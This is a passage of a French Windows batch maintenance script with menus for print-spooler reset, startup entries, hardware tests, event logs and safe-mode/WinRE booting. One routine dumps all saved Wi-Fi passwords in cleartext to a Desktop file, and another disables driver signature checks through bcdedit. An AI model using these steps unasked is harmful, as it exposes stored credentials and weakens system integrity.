echo   VIDAGE DE LA FILE D'ATTENTE D'IMPRESSION
echo ================================================
echo.
echo  [1/3] Arret du service Spooler...
net stop Spooler >nul 2>&1
echo  [2/3] Suppression des travaux bloques...
del /Q /F /S "%SystemRoot%\System32\spool\PRINTERS\*" >nul 2>&1
echo  [3/3] Redemarrage du service Spooler...
net start Spooler >nul 2>&1
echo.
echo  [OK] File d'attente videe et Spooler redemarre !
echo  Tous les travaux d'impression bloques ont ete supprimes.
echo.
pause
goto sys_print_manager

:print_remove
cls
echo ================================================
echo   SUPPRIMER UNE IMPRIMANTE
echo ================================================
echo.
echo  Imprimantes disponibles :
echo.
powershell -NoProfile -Command "$i=1; Get-Printer | ForEach-Object { Write-Host ('  ['+$i+'] '+$_.Name) -f Cyan; $i++ }"
echo.
set /p pr_name= Nom exact de l'imprimante a supprimer: 
if "%pr_name%"=="" goto sys_print_manager
echo.
powershell -NoProfile -Command "Remove-Printer -Name '%pr_name%' -EA SilentlyContinue; if($?){Write-Host '[OK] Imprimante supprimee avec succes.' -f Green}else{Write-Host '[ECHEC] Imprimante introuvable ou erreur.' -f Red}"
echo.
pause
goto sys_print_manager

:print_restart_spooler
cls
echo ================================================
echo   REDEMARRAGE DU SERVICE SPOOLER
echo ================================================
echo.
echo  Arret du Spooler...
net stop Spooler >nul 2>&1
timeout /t 2 /nobreak >nul
echo  Demarrage du Spooler...
net start Spooler >nul 2>&1
echo.
echo  [OK] Service Spooler redemarre avec succes.
echo.
pause
goto sys_print_manager

REM ===================================================================
REM              GESTIONNAIRE DES PROGRAMMES AU DEMARRAGE
REM ===================================================================
:sys_startup_manager
cls
echo ================================================
echo   PROGRAMMES AU DEMARRAGE DE WINDOWS
echo ================================================
echo.
echo  Analyse en cours...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$items = Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User;" ^
    "$i=1;" ^
    "Write-Host ('  Trouvé '+$items.Count+' programme(s) au démarrage:') -f Cyan;" ^
    "Write-Host '';" ^
    "foreach($x in $items){" ^
    "    Write-Host ('  ['+$i+'] '+$x.Name) -f White -NoNewline;" ^
    "    Write-Host (' | User: '+$x.User) -f DarkGray;" ^
    "    Write-Host ('       '+$x.Command) -f DarkGray;" ^
    "    $i++" ^
    "}"
echo.
echo ================================================
echo  Pour desactiver, ouvrez le Gestionnaire des taches
echo  (Ctrl+Shift+Esc) onglet 'Demarrage'.
echo.
set "opts=Desactiver via le Gestionnaire des taches~Ouvre directement Ctrl+Shift+Esc onglet Demarrage;Desactiver via Registre HKCU~Supprime une entree dans HKCU Run (utilisateur courant);Desactiver via Registre HKLM~Supprime une entree dans HKLM Run (tous utilisateurs)"
call :DynamicMenu "ACTION SUR LES PROGRAMMES DEMARRAGE" "%opts%"
set "su_choice=%errorlevel%"

if "%su_choice%"=="0" goto sys_opti_menu
if "%su_choice%"=="1" (
    powershell -Command "Start-Process taskmgr"
    timeout /t 2 /nobreak >nul
    goto sys_startup_manager
)
if "%su_choice%"=="2" goto startup_del_hkcu
if "%su_choice%"=="3" goto startup_del_hklm
goto sys_startup_manager

:startup_del_hkcu
cls
echo  Entrees dans HKCU\...\Run (utilisateur courant) :
echo.
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" 2>nul
echo.
set /p su_name= Nom de valeur a supprimer: 
if "%su_name%"=="" goto sys_startup_manager
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%su_name%" /f
if %errorlevel%==0 (echo [OK] Entree '%su_name%' supprimee du demarrage.) else (echo [ECHEC] Entree introuvable.)
pause
goto sys_startup_manager

:startup_del_hklm
cls
echo  Entrees dans HKLM\...\Run (tous utilisateurs) :
echo.
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" 2>nul
echo.
set /p su_name= Nom de valeur a supprimer: 
if "%su_name%"=="" goto sys_startup_manager
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "%su_name%" /f
if %errorlevel%==0 (echo [OK] Entree '%su_name%' supprimee du demarrage.) else (echo [ECHEC] Entree introuvable.)
pause
goto sys_startup_manager

REM ===================================================================
REM              TEST DES COMPOSANTS PC (BENCHMARK)
REM ===================================================================
:sys_hw_test
call :AutoMenu "TEST DES COMPOSANTS PC" "hw_smart;hw_winsat;hw_ram_test;hw_full_report;hw_all"
if "%errorlevel%"=="0" (
    if defined diag_back (goto !diag_back!) else (goto system_tools)
)
goto !AutoMenu_Target!

:hw_smart
if "%~1"=="SILENT" goto :hw_smart_core
cls
echo ================================================
echo   SANTE DES DISQUES - SMART
echo ================================================
echo.
:hw_smart_core
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$disks = Get-PhysicalDisk | Select-Object FriendlyName,MediaType,HealthStatus,OperationalStatus,Size;" ^
    "foreach($d in $disks){" ^
    "    $color = if($d.HealthStatus -eq 'Healthy'){'Green'}else{'Red'};" ^
    "    $size = [math]::Round($d.Size/1GB,1);" ^
    "    Write-Host ('  [+] '+$d.FriendlyName+' ('+$d.MediaType+', '+$size+' Go)') -f Cyan;" ^
    "    Write-Host ('      Sante: '+$d.HealthStatus+' | Statut: '+$d.OperationalStatus) -f $color;" ^
    "    Write-Host '' " ^
    "}"
if "%~1"=="SILENT" exit /b
echo.
pause
goto sys_hw_test

:hw_winsat
if "%~1"=="SILENT" goto :hw_winsat_core
cls
echo ================================================
echo   TEST PERFORMANCE DISQUE (WinSAT)
echo ================================================
echo.
echo  [!] Test en cours, patientez (30-60 secondes)...
echo.
:hw_winsat_core
winsat disk -drive c >nul 2>&1
powershell -NoProfile -Command ^
    "$r=Get-CimInstance -ClassName Win32_WinSAT -EA SilentlyContinue;" ^
    "if($r){" ^
    "    Write-Host '  Scores WinSAT:' -f Cyan;" ^
    "    Write-Host ('  Disque          : '+$r.DiskScore) -f Green;" ^
    "    Write-Host ('  CPU             : '+$r.CPUScore) -f Green;" ^
    "    Write-Host ('  RAM             : '+$r.MemoryScore) -f Green;" ^
    "    Write-Host ('  Graphismes      : '+$r.GraphicsScore) -f Green;" ^
    "    Write-Host ('  Graphismes Gaming: '+$r.D3DScore) -f Green;" ^
    "    Write-Host '';" ^
    "    $d=$r.DiskScore;" ^
    "    if($d -ge 7.5){Write-Host '  [OK] Disque tres rapide (SSD NVMe ou equivalent)' -f Green}" ^
    "    elseif($d -ge 5.5){Write-Host '  [OK] Disque rapide (SSD SATA)' -f Yellow}" ^
    "    elseif($d -ge 3.0){Write-Host '  [ATTENTION] Disque lent (HDD ou SSD use)' -f Yellow}" ^
    "    else{Write-Host '  [CRITIQUE] Disque tres lent ou defaillant !' -f Red}" ^
    "}else{Write-Host '  [INFO] Score WinSAT non disponible, relancez le test.' -f Yellow}"
if "%~1"=="SILENT" exit /b
echo.
pause
goto sys_hw_test

:hw_ram_test
cls
echo ================================================
echo   TEST DE LA MEMOIRE RAM
echo ================================================
echo.
echo  Le test RAM necessite un redemarrage du PC.
echo  Windows effectuera le diagnostic avant de demarrer.
echo.
echo -----------------------------------------------
echo  Planifier le test RAM au prochain demarrage ?
echo -----------------------------------------------
powershell -NoProfile -ExecutionPolicy Bypass -Command "$sel=0;$done=$false;[Console]::CursorVisible=$false;while(-not $done){if($sel -eq 0){Write-Host '  [>] Oui ' -f Green;Write-Host '  [ ] Non ' -f DarkGray}else{Write-Host '  [ ] Oui ' -f DarkGray;Write-Host '  [>] Non ' -f Red};$k=[Console]::ReadKey($true);switch($k.Key){'UpArrow'{$sel=1-$sel}'DownArrow'{$sel=1-$sel}'Enter'{$done=$true}};if(-not $done){[Console]::SetCursorPosition(0,[Console]::CursorTop-2)}};[Console]::CursorVisible=$true;exit $sel"
set "ram_choice=%errorlevel%"
if "%ram_choice%"=="0" (
    MdSched.exe
) else (
    echo.
    echo  Operation annulee.
)
echo.
pause
if defined diag_back (goto !diag_back!) else (goto sys_hw_test)

:hw_full_report
if "%~1"=="SILENT" goto :hw_full_report_core
cls
echo ================================================
echo   RAPPORT COMPLET DES COMPOSANTS
echo ================================================
echo.
:hw_full_report_core
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$cpu=Get-CimInstance Win32_Processor | Select-Object -First 1;" ^
    "$ram=Get-CimInstance Win32_ComputerSystem;" ^
    "$pm=@(Get-CimInstance Win32_PhysicalMemory);" ^
    "$gpu=Get-CimInstance Win32_VideoController;" ^
    "$bios=Get-CimInstance Win32_BIOS;" ^
    "$mb=Get-CimInstance Win32_BaseBoard;" ^
    "$memTypes=@{20='DDR';21='DDR2';24='DDR3';26='DDR4';34='DDR5'};" ^
    "$mtype=if($pm.Count -gt 0 -and $memTypes.ContainsKey($pm[0].SMBIOSMemoryType)){$memTypes[$pm[0].SMBIOSMemoryType]}else{'Inconnu'};" ^
    "$ramGo=[math]::Round($ram.TotalPhysicalMemory/1GB,2);" ^
    "Write-Host '';" ^
    "Write-Host '  PROCESSEUR (CPU)' -f Cyan;" ^
    "Write-Host ('  '+$cpu.Name);" ^
    "Write-Host ('  Coeurs: '+$cpu.NumberOfCores+' | Threads: '+$cpu.NumberOfLogicalProcessors+' | Freq. base: '+$cpu.MaxClockSpeed+' MHz');" ^
    "Write-Host ('  Usage actuel: '+$cpu.LoadPercentage+'%%') -f $(if($cpu.LoadPercentage -lt 70){'Green'}else{'Red'});" ^
    "Write-Host '';" ^
    "Write-Host '  MEMOIRE RAM' -f Cyan;" ^
    "Write-Host ('  '+$ramGo+' Go - Type: '+$mtype+' - Slots utilises: '+$pm.Count);" ^
    "if($pm.Count -gt 0){Write-Host ('  Vitesse: '+$pm[0].Speed+' MHz | Fabricant: '+$pm[0].Manufacturer)};" ^
    "Write-Host '';" ^
    "Write-Host '  CARTE GRAPHIQUE (GPU)' -f Cyan;" ^
    "foreach($g in $gpu){$vram=[math]::Round($g.AdapterRAM/1MB,0); Write-Host ('  '+$g.Name+' ('+$vram+' Mo VRAM) | Pilote: '+$g.DriverVersion)};" ^
    "Write-Host '';" ^
    "Write-Host '  CARTE MERE & BIOS' -f Cyan;" ^
    "Write-Host ('  Fabricant: '+$mb.Manufacturer+' | Modele: '+$mb.Product);" ^
    "Write-Host ('  BIOS: '+$bios.Manufacturer+' v'+$bios.SMBIOSBIOSVersion+' ('+$bios.ReleaseDate+')');" ^
    "Write-Host '';" ^
    "Write-Host '  DISQUES' -f Cyan;" ^
    "Get-PhysicalDisk | ForEach-Object {$s=[math]::Round($_.Size/1GB,1); Write-Host ('  '+$_.FriendlyName+' ('+$_.MediaType+', '+$s+' Go) - Sante: '+$_.HealthStatus) -f $(if($_.HealthStatus -eq 'Healthy'){'Green'}else{'Red'})}"
if "%~1"=="SILENT" exit /b
echo.
pause
goto sys_hw_test

:hw_all
cls
echo ================================================
echo   LANCEMENT DE TOUS LES TESTS MATERIELS
echo ================================================
echo.
echo  [1/3] Analyse SMART des disques...
call :hw_smart SILENT
echo.
echo  [2/3] Performance disque et systeme (WinSAT)...
echo  [!] Patientez, ce test est long...
call :hw_winsat SILENT
echo.
echo  [3/3] Analyse complete des composants...
call :hw_full_report SILENT
echo.
echo ================================================
echo   [FIN] TOUS LES TESTS SONT TERMINES.
echo ================================================
echo.
pause
goto sys_hw_test

REM ===================================================================
REM              JOURNAUX D'ERREURS WINDOWS FILTRES
REM ===================================================================
:sys_event_log
call :AutoMenu "JOURNAUX D'ERREURS WINDOWS" "ev_critical_24h;ev_critical_7d;ev_app_24h;ev_disk_warn"
if "%errorlevel%"=="0" (
    if defined diag_back (goto !diag_back!) else (goto system_tools)
)
goto !AutoMenu_Target!

:ev_critical_24h
cls
echo ================================================
echo   ERREURS CRITIQUES - 24 DERNIERES HEURES
echo ================================================
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$since=(Get-Date).AddHours(-24); $evts=Get-WinEvent -FilterHashtable @{LogName='System';Level=1,2;StartTime=$since} -EA SilentlyContinue | Select-Object -First 30; if(-not $evts){Write-Host '  [OK] Aucune erreur critique dans les 24 dernieres heures.' -f Green} else{Write-Host ('  ' + $evts.Count + ' evenement(s) critique(s):') -f Red; Write-Host ''; foreach($e in $evts){$msg=$e.Message.Split([Environment]::NewLine)[0].Trim(); if($msg.Length -gt 90){$msg=$msg.Substring(0,90)+'...'}; Write-Host ('  [' + $e.TimeCreated.ToString('HH:mm:ss') + '] ID:' + $e.Id + ' | ' + $e.ProviderName + ' | ' + $msg) -f Yellow}}"
echo.
pause
goto sys_event_log

:ev_critical_7d
cls
echo ================================================
echo   ERREURS CRITIQUES - 7 DERNIERS JOURS
echo ================================================
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$since=(Get-Date).AddDays(-7); $evts=Get-WinEvent -FilterHashtable @{LogName='System';Level=1,2;StartTime=$since} -EA SilentlyContinue | Select-Object -First 50; if(-not $evts){Write-Host '  [OK] Aucune erreur critique cette semaine.' -f Green} else{Write-Host ('  ' + $evts.Count + ' evenement(s) critique(s) (50 max):') -f Red; Write-Host ''; foreach($e in $evts){$msg=$e.Message.Split([Environment]::NewLine)[0].Trim(); if($msg.Length -gt 90){$msg=$msg.Substring(0,90)+'...'}; Write-Host ('  [' + $e.TimeCreated.ToString('dd/MM HH:mm') + '] ID:' + $e.Id + ' | ' + $e.ProviderName + ' | ' + $msg) -f Yellow}}"
echo.
pause
goto sys_event_log

:ev_app_24h
cls
echo ================================================
echo   ERREURS APPLICATIONS - 24H
echo ================================================
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$since=(Get-Date).AddHours(-24); $evts=Get-WinEvent -FilterHashtable @{LogName='Application';Level=1,2;StartTime=$since} -EA SilentlyContinue | Select-Object -First 30; if(-not $evts){Write-Host '  [OK] Aucun crash applicatif dans les 24 dernieres heures.' -f Green} else{Write-Host ('  ' + $evts.Count + ' crash(s) applicatif(s):') -f Red; Write-Host ''; foreach($e in $evts){$msg=$e.Message.Split([Environment]::NewLine)[0].Trim(); if($msg.Length -gt 90){$msg=$msg.Substring(0,90)+'...'}; Write-Host ('  [' + $e.TimeCreated.ToString('HH:mm:ss') + '] ID:' + $e.Id + ' | ' + $e.ProviderName + ' | ' + $msg) -f Yellow}}"
echo.
pause
goto sys_event_log

:ev_disk_warn
cls
echo ================================================
echo   AVERTISSEMENTS DISQUE / STOCKAGE
echo ================================================
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$since=(Get-Date).AddDays(-30); $evts=Get-WinEvent -FilterHashtable @{LogName='System';ProviderName='disk','nvme','stornvme','iaStorAV';StartTime=$since} -EA SilentlyContinue | Where-Object {$_.Level -le 3} | Select-Object -First 20; if(-not $evts){Write-Host '  [OK] Aucun avertissement disque detecte (30 derniers jours).' -f Green} else{Write-Host ('  ' + $evts.Count + ' avertissement(s) disque:') -f Yellow; Write-Host ''; foreach($e in $evts){$lv=if($e.Level -eq 2){'ERR'}elseif($e.Level -eq 3){'WARN'}else{'CRIT'}; $msg=$e.Message.Split([Environment]::NewLine)[0].Trim(); if($msg.Length -gt 80){$msg=$msg.Substring(0,80)+'...'}; Write-Host ('  [' + $lv + '][' + $e.TimeCreated.ToString('dd/MM HH:mm') + '] ID:' + $e.Id + ' | ' + $e.ProviderName + ' | ' + $msg) -f $(if($e.Level -eq 2){'Red'}else{'Yellow'})}}"
pause
goto sys_event_log

REM ===================================================================
REM              MODE REPARATION ET DEMARRAGE WINDOWS
REM ===================================================================
:sys_winre
call :AutoMenu "MODE DEMARRAGE / REPARATION WINDOWS" "res_explorer_restart;res_gpu_reset;winre_boot;winre_bios;winre_bootmenu;winre_safe_minimal;winre_safe_network;winre_safe_cmd;winre_nosign;winre_status;winre_reset"
if "%errorlevel%"=="0" goto system_tools
goto !AutoMenu_Target!

:winre_boot
cls
echo.
echo  ================================================
echo   DEMARRAGE DANS WINRE (Environnement Reparation)
echo  ================================================
echo  Acces direct : Reparation / Restauration / CMD
echo  Redemarrage dans 5 secondes...
echo.
reagentc /boottore >nul 2>&1
if %errorlevel% neq 0 (
    echo  [ERREUR] WinRE indisponible sur ce PC.
    echo  Conseil : verifiez avec "Verifier statut WinRE".
    pause & goto sys_winre
)
echo  [OK] WinRE programme pour le prochain demarrage.
timeout /t 5 /nobreak >nul
shutdown /r /t 0 & exit

:winre_bios
cls
echo.
echo  ================================================
echo   DEMARRAGE DANS LE BIOS / UEFI
echo  ================================================
echo  Acces direct au firmware de la carte mere.
echo  Redemarrage dans 5 secondes...
timeout /t 5 /nobreak >nul
shutdown /r /fw /t 0 & exit

:winre_bootmenu
cls
echo.
echo  ================================================
echo   MENU DE DEMARRAGE (BOOT MENU)
echo  ================================================
echo  Permet de choisir le peripherique de boot
echo  (cle USB, disque externe, lecteur reseau...).
echo.
echo  [1/2] Activation du boot menu...
bcdedit /set {bootmgr} displaybootmenu yes >nul 2>&1
echo  [2/2] Redemarrage dans 5 secondes...
echo.
echo  NOTE : Le boot menu sera desactive apres 1 boot
echo  normal pour ne pas alourdir le demarrage.
timeout /t 5 /nobreak >nul
shutdown /r /t 0 & exit

:winre_safe_minimal
cls
echo.
echo  ================================================
echo   MODE SANS ECHEC - MINIMAL
echo  ================================================
echo  Pilotes de base uniquement. Le plus stable.
echo  Ce script se relancera pour restaurer le mode normal.
echo  Redemarrage dans 5 secondes...
bcdedit /set {current} safeboot minimal >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SafeModeRevert" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
timeout /t 5 /nobreak >nul
shutdown /r /t 0 & exit

:winre_safe_network
cls
echo.
echo  ================================================
echo   MODE SANS ECHEC - AVEC RESEAU
echo  ================================================
echo  Pilotes de base + acces internet disponible.
echo  Ce script se relancera pour restaurer le mode normal.
echo  Redemarrage dans 5 secondes...
bcdedit /set {current} safeboot network >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SafeModeRevert" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
timeout /t 5 /nobreak >nul
shutdown /r /t 0 & exit

:winre_safe_cmd
cls
echo.
echo  ================================================
echo   MODE SANS ECHEC - INVITE DE COMMANDES
echo  ================================================
echo  Safe Mode avec shell CMD au lieu de l Explorer.
echo  Ce script se relancera pour restaurer le mode normal.
echo  Redemarrage dans 5 secondes...
bcdedit /set {current} safeboot minimal >nul 2>&1
bcdedit /set {current} safebootalternateshell yes >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SafeModeRevert" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
timeout /t 5 /nobreak >nul
shutdown /r /t 0 & exit

:winre_nosign
cls
echo.
echo  ================================================
echo   DESACTIVATION SIGNATURE PILOTES (1 BOOT)
echo  ================================================
echo  Permet d installer des pilotes non signes
echo  lors du prochain demarrage uniquement.
echo  Redemarrage dans 5 secondes...
bcdedit /set {current} nointegritychecks on >nul 2>&1
timeout /t 5 /nobreak >nul
shutdown /r /t 0 & exit

:winre_status
cls
echo.
echo  ================================================
echo   STATUT WINRE ET PARAMETRES BCDEDIT
echo  ================================================
echo.
reagentc /info
echo.
echo  --- Parametres de demarrage actifs (bcdedit) ---
bcdedit /enum {current} | findstr /i "safeboot nointegritychecks safebootalternate bootmenupolicy"
echo.
pause
goto sys_winre

:winre_reset
cls
echo.
echo  ================================================
echo   REINITIALISATION DES PARAMETRES DE DEMARRAGE
echo  ================================================
echo.
echo  Suppression des flags appliques (safeboot, nosign...)
bcdedit /deletevalue {current} safeboot >nul 2>&1
bcdedit /deletevalue {current} safebootalternateshell >nul 2>&1
bcdedit /deletevalue {current} nointegritychecks >nul 2>&1
bcdedit /set {bootmgr} displaybootmenu no >nul 2>&1
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SafeModeRevert" /f >nul 2>&1
echo  [OK] Tous les parametres de demarrage ont ete reinitialises.
echo  [OK] RunOnce nettoye.
echo.
pause
goto sys_winre

REM ===================================================================
REM              EXPORT WI-FI + LOGICIELS (COMBO TXT BUREAU)
REM ===================================================================
:sys_export_wifi_apps
cls
echo ================================================
echo   EXPORT Wi-Fi + Logiciels - Fichiers TXT Bureau
echo ================================================
echo.
echo  [1/2] Export de la liste des logiciels...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%USERPROFILE%\Desktop\Logiciels_Installes.txt'; $p=@('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'); $apps=($p | ForEach-Object { Get-ItemProperty $_ -EA SilentlyContinue } | Where-Object { $_.DisplayName } | Sort-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher -Unique); $nl=[Environment]::NewLine; $sep=New-Object string '=',60; $h='LOGICIELS INSTALLES - '+(Get-Date -Format 'dd/MM/yyyy HH:mm')+$nl+'Ordinateur : '+$env:COMPUTERNAME+$nl+'Total      : '+$apps.Count+' logiciels'+$nl+$sep; $h | Out-File $f -Encoding UTF8; $apps | ForEach-Object { '[+] '+$_.DisplayName+' v'+$_.DisplayVersion+' | '+$_.Publisher } | Out-File $f -Encoding UTF8 -Append; Write-Host ('  [OK] '+$apps.Count+' logiciels exportes.') -f Green"
echo.
echo  [2/2] Export des mots de passe Wi-Fi...
echo.
set "FWIFI=%USERPROFILE%\Desktop\Mots_de_passe_WiFi.txt"
> "%FWIFI%" echo Mots de passe Wi-Fi - %date% %time%
>> "%FWIFI%" echo Ordinateur : %COMPUTERNAME%
>> "%FWIFI%" echo ============================================================
setlocal enabledelayedexpansion
set "wifi_found=0"
for /f "tokens=2 delims=:" %%I in ('netsh wlan show profiles ^| findstr /C:"Profil Tous" /C:"All User Profile"') do (
    set "ssid=%%I"
    set "ssid=!ssid:~1!"
    if not "!ssid!"=="" (
        set "wifi_found=1"
        set "pwd="
        for /f "tokens=2 delims=:" %%K in ('netsh wlan show profile name^="!ssid!" key^=clear ^| findstr /C:"Contenu de la cl" /C:"Key Content"') do (
            set "pwd=%%K"
        )
        set "pwd=!pwd:~1!"
        if "!pwd!"=="" set "pwd=(Aucun / Reseau ouvert)"
        >> "%FWIFI%" echo [+] SSID : !ssid!
        >> "%FWIFI%" echo     MDP  : !pwd!
        >> "%FWIFI%" echo.
        echo  [+] !ssid!
    )
)
endlocal
echo.
echo ================================================
if exist "%USERPROFILE%\Desktop\Logiciels_Installes.txt" echo  [OK] Logiciels_Installes.txt cree sur le Bureau
if exist "%USERPROFILE%\Desktop\Mots_de_passe_WiFi.txt"  echo  [OK] Mots_de_passe_WiFi.txt  cree sur le Bureau
echo ================================================
echo.
pause
goto sys_export_menu

REM ===================================================================
REM              MODE SANS ECHEC (TOGGLE) - CORRIGE
REM ===================================================================
:sys_safemode
cls
REM === Supprimer RunOnce EN PREMIER pour eviter toute boucle ===
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SafeModeRevert" /f >nul 2>&1

if not defined SAFEBOOT_OPTION goto safemode_config

REM =====================================================
REM  ON EST EN MODE SANS ECHEC -> MENU RETOUR
REM =====================================================
color 0E
set "opts=Revenir en mode NORMAL~Restaurer le demarrage standard et redemarrer le PC;Quitter~Rester en mode sans echec et fermer ce script"
call :DynamicMenu "MODE SANS ECHEC ACTIF - Type: %SAFEBOOT_OPTION%" "%opts%"
set "sm_res=%errorlevel%"

if "%sm_res%"=="0" (
    echo.
    echo  Pour revenir en mode normal plus tard, relancez ce script.
    pause
    exit
)
if "%sm_res%"=="1" goto safemode_revert
if "%sm_res%"=="2" (
    echo.
    echo  Pour revenir en mode normal plus tard, relancez ce script.
    pause
    exit
)
goto sys_safemode

:safemode_revert
cls
echo.
echo  [1/2] Suppression de la config mode sans echec...
bcdedit /deletevalue {current} safeboot >nul 2>&1
if %errorlevel%==0 (
    echo  [OK] Mode normal restaure.
) else (
    echo  [INFO] Deja en mode normal ou erreur bcdedit.
)
echo  [2/2] Redemarrage dans 5 secondes...
echo.
echo  ================================================
echo  [OK] Le PC va redemarrer NORMALEMENT.
echo  ================================================
timeout /t 5 /nobreak >nul
shutdown /r /t 0
exit

REM =====================================================
REM  ON EST EN MODE NORMAL -> ACTIVATION SAFE MODE
REM =====================================================
:safemode_config
color 0B
set "opts=Mode Minimal~Pilotes de base uniquement - le plus stable;Avec Reseau~Acces internet disponible (Wi-Fi ou Ethernet)"
call :DynamicMenu "MODE SANS ECHEC - Choisissez le type de demarrage" "%opts%"
set "sm_cfg=%errorlevel%"

if "%sm_cfg%"=="0" goto system_tools
if "%sm_cfg%"=="1" set "SM_TYPE=minimal"
if "%sm_cfg%"=="2" set "SM_TYPE=network"
if not defined SM_TYPE goto safemode_config

cls
echo.
echo  [1/3] Configuration bcdedit (%SM_TYPE%)...
bcdedit /set {current} safeboot %SM_TYPE% >nul 2>&1
if %errorlevel% neq 0 (
    echo  [ERREUR] bcdedit a echoue. Droits insuffisants ?
    pause
    goto system_tools
)
echo  [OK] Mode sans echec (%SM_TYPE%) programme.

echo  [2/3] Inscription RunOnce pour restauration automatique...
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SafeModeRevert" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
echo  [OK] Script inscrit au demarrage automatique.

echo  [3/3] Redemarrage dans 5 secondes...
echo.
echo  ================================================
echo  APRES LE REDEMARRAGE :
echo  - Windows demarrera en MODE SANS ECHEC
echo  - Ce script se relancera automatiquement
echo  - Selectionnez "Revenir en mode NORMAL"
echo  ================================================
timeout /t 5 /nobreak >nul
shutdown /r /t 0
exit

REM ===================================================================
REM                    SORTIE DU SCRIPT
REM ===================================================================
:exit_script
cls
echo ======================================================
echo     MERCI D'AVOIR UTILISE CET OUTIL !
echo ======================================================
echo.
echo Developpe par ALEEXLEDEV
echo.
echo Appuyez sur une touche pour quitter...
pause >nul
exit

:InputWithEsc
set "%~2="
if exist "%TEMP%\in.txt" del "%TEMP%\in.txt"
set "ps_in=$Host.UI.RawUI.FlushInputBuffer(); [Console]::Write('%~1'); $s=''; while($true) { if ($Host.UI.RawUI.KeyAvailable) { $k=$Host.UI.RawUI.ReadKey('IncludeKeyDown,NoEcho'); $vc=$k.VirtualKeyCode; if ($vc -eq 27) { [Console]::WriteLine(); exit 1 }; if ($vc -eq 13) { [Console]::WriteLine(); Set-Content -Path '%TEMP%\in.txt' -Value $s -Encoding ASCII; exit 0 }; if ($vc -eq 8) { if ($s.Length -gt 0) { $s=$s.Substring(0,$s.Length-1); [Console]::Write(([char]8).ToString()+' '+([char]8).ToString()) } } elseif ($vc -eq 86 -and ($k.ControlKeyState -match 'LeftCtrlPressed|RightCtrlPressed')) { $cb=[Windows.Clipboard]::GetText(); if ($cb) { $s+=$cb; [Console]::Write($cb) } } else { $c=$k.Character; $ci=[int][char]$c; if ($ci -ge 32 -and $ci -le 126 -or $ci -gt 127) { $s+=$c; [Console]::Write($c) } } } Start-Sleep -Milliseconds 10 }"
powershell -NoProfile -ExecutionPolicy Bypass -Command "%ps_in%"
if errorlevel 1 exit /b 1
if exist "%TEMP%\in.txt" (
    set /p "%~2=" < "%TEMP%\in.txt"
    del "%TEMP%\in.txt"
)
exit /b 0

:DynamicMenu
:: Arguments: %1="Titre", %2="Option1;Option2;Option3", %3="OptionFlags" (ex: NONUMS)
:: Retourne: ERRORLEVEL (1, 2, 3...) ou 0 pour Echap/Retour
setlocal disabledelayedexpansion
set "m_title=%~1"
set "m_opts=%~2"
set "m_flags=%~3"

set "ps_cmd=while($Host.UI.RawUI.KeyAvailable){$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown,IncludeKeyUp')|Out-Null};$o=($env:m_opts -split ';');$t=$env:m_title;$fl=$env:m_flags;$sel=@();for($i=0;$i -lt $o.Count;$i++){if($o[$i] -notmatch '^\[---'){$sel+=$i}};$Idx=0;$pad=115;try{if([console]::WindowWidth -gt 5){$pad=[math]::Min([console]::WindowWidth-5,115)}}catch{};$maxV=50;try{if([console]::WindowHeight -gt 0){$maxV=[math]::Max([console]::WindowHeight-10,10)}}catch{};$topI=0;if($fl -notmatch 'NOCLS'){clear-host;try{$cY=[console]::WindowTop}catch{$cY=0}}else{try{$cY=[console]::CursorTop}catch{$cY=0}};if($env:SHOW_LOGO -eq '1'){$maxV=[math]::Max($maxV-9,10)};function D{try{[console]::SetCursorPosition(0,$cY)}catch{};if($env:SHOW_LOGO -eq '1'){ write-host '  ▄▄▄▄▄▄▄ ▄▄       ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄   ▄▄    ▄▄       ▄▄▄▄▄▄▄    ▄▄▄▄▄▄  ▄▄▄▄▄▄▄ ▄▄   ▄▄ ';write-host ' █       █  █     █       █       █  █ █  █  █  █     █       █  █      ██       █  █ █  █';write-host ' █   ▄   █  █     █    ▄▄▄█    ▄▄▄█  █▄█  █  █  █     █    ▄▄▄█  █  ▄    █    ▄▄▄█  █▄█  █';write-host ' █  █▄█  █  █     █   █▄▄▄█   █▄▄▄█       █  █  █     █   █▄▄▄   █ █ █   █   █▄▄▄█       █';write-host ' █       █  █▄▄▄▄▄█    ▄▄▄█    ▄▄▄█       █  █  █▄▄▄▄▄█    ▄▄▄█  █ █▄█   █    ▄▄▄█       █';write-host ' █   ▄   █       █   █▄▄▄█   █▄▄▄█   ▄   █  █       █   █▄▄▄   █       █   █▄▄▄█   ▄   █';write-host ' █▄▄█ █▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄█ █▄▄█  █▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█  